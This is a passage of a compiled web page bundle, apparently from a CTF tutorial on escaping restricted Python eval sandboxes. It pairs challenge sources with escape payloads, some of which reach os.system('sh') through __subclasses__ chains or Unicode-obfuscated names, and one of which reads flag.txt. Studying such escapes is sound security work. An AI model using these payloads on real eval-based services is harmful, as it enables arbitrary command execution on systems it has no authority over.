        <span class="token keyword">if</span> char<span class="token punctuation">.</span>isidentifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> char <span class="token keyword">not</span> <span class="token keyword">in</span> names<span class="token punctuation">:</span>
            names<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

table <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'__iter__'</span><span class="token punctuation">:</span> <span class="token number">710</span><span class="token punctuation">,</span>
    <span class="token string">'__reversed__'</span><span class="token punctuation">:</span> <span class="token number">713</span><span class="token punctuation">,</span>
    <span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token number">716</span><span class="token punctuation">,</span>
    <span class="token string">'__dir__'</span><span class="token punctuation">:</span> <span class="token number">1144</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">def</span> <span class="token function">load_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> names<span class="token punctuation">[</span>table<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">]</span>
builtins <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'fn(fn,fn.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>load_name<span class="token punctuation">(</span><span class="token string">"__dir__"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">()[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getnum<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">])'</span></span>
code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''lambda fn: [</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>names<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">] if [] else [
    fn(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>builtins<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>builtins<span class="token punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>load_name<span class="token punctuation">(</span><span class="token string">"__dir__"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">()[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getnum<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">])()]
'''</span></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>  <span class="token comment"># copy this to the server</span>
co <span class="token operator">=</span> clear<span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> __name__<span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>co<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>co<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">(</span>co<span class="token punctuation">.</span>co_names<span class="token punctuation">)</span><span class="token punctuation">)</span>
val <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>co<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span></code>`,Lu,_a,Kp,k_,Tu,da,Ie,je,r_,Au,fa,B2='<code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code> "</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>',Ou,ma,Ne,Pe,i_,Fu,ba,S2='<code class="language-py"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span></code>',Ru,ya,Zp,__,Du,ga,He,Ue,d_,Iu,wa,q2=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code> "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">72</span><span class="token punctuation">]</span>
<span class="token keyword">if</span> <span class="token string">"__"</span> <span class="token keyword">in</span> inp<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nope"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,ju,va,Me,Be,f_,Nu,Ea,z2=`<code class="language-py"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F<span class="token keyword">class</span>\uFF3F_<span class="token punctuation">.</span>_\uFF3Fbase\uFF3F_<span class="token punctuation">.</span>_\uFF3Fsubclasses\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span></code>`,Pu,ha,Xp,m_,Hu,xa,Se,qe,b_,Uu,Ca,W2=`<code class="language-py"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[a-z0-9]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">130</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,Mu,La,ze,We,y_,Bu,Ta,Y2=`<code class="language-py">__\u{1D62A}\u{1D62E}\u{1D631}\u{1D630}\u{1D633}\u{1D635}__<span class="token punctuation">(</span>\u{1D624}\u{1D629}\u{1D633}<span class="token punctuation">(</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u029A'</span><span class="token punctuation">)</span><span class="token operator">-</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u022B'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>\u{1D624}\u{1D629}\u{1D633}<span class="token punctuation">(</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u0159'</span><span class="token punctuation">)</span><span class="token operator">-</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\xE6'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span>\u{1D624}\u{1D629}\u{1D633}<span class="token punctuation">(</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u0159'</span><span class="token punctuation">)</span><span class="token operator">-</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\xE6'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>\u{1D624}\u{1D629}\u{1D633}<span class="token punctuation">(</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u0209'</span><span class="token punctuation">)</span><span class="token operator">-</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u01A1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,Su,Aa,Qp,g_,qu,Oa,Ye,Ge,w_,zu,Fa,G2=`<code class="language-py"><span class="token keyword">import</span> re
FLAG <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'[123456789]'</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'('</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1337</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span></code>`,Wu,Ra,Ve,$e,v_,Yu,Da,V2='<code class="language-py"><span class="token punctuation">[</span><span class="token keyword">_</span><span class="token operator">:=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token 